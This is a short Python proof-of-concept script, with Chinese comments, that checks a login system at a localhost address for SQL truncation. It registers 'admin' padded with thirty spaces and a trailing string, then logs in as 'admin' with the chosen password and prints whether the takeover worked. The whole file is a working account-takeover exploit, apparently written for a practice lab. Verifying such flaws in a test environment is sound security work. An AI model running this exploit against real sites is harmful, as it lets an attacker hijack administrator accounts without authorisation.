#! python3

import random
import requests

def poc(addr , post_data ,login_data, validation):
    # 判断是否存在sql截断

    res = requests.post(addr['logout'])
    res = requests.post(addr['reg'] , data=post_data)
    res = requests.post(addr['login'] , data=login_data)
    if(res.status_code == 200) :
         # print(res.url)
        login_hText = res.text
        # print(login_hText)
        if(validation['invalid'] in login_hText ) : 
            print("抱歉！未成功验证【SQL截断】")
        elif(validation['success'] in login_hText) :
            print('成功验证【SQL截断】')

def main():
    # addr
    addr  =  {
        'login' : "http://127.0.0.1:1088/authenticate.php" ,
        'reg'   : "http://127.0.0.1:1088/register.php" , 
        'index' : "http://127.0.0.1:1088/index.php" ,
        'logout': "http://127.0.0.1:1088/logout.php" 
    }
    n = 0 
    for k in range(0,9):
        n += random.randint(0,9) 
        n *= 10 
    password = n 
    login_data = {
        'username'  :   "admin",
        'password'  :   password
        # 验证码 ---
    }
    post_data = {
        'username'  :   "admin" + (" "*30) + "end",
        'password'  :   password
        # 验证码 ---
    }
    print("[username]:%s \n[password]:%s"%(login_data['username'] , login_data['password']))
    # Validation
    validation = {
        'success'    :  "Congrats",
        'invalid'    :  "Invalid"
    }
    poc(addr , post_data , login_data, validation)

if __name__ == "__main__":
    main()
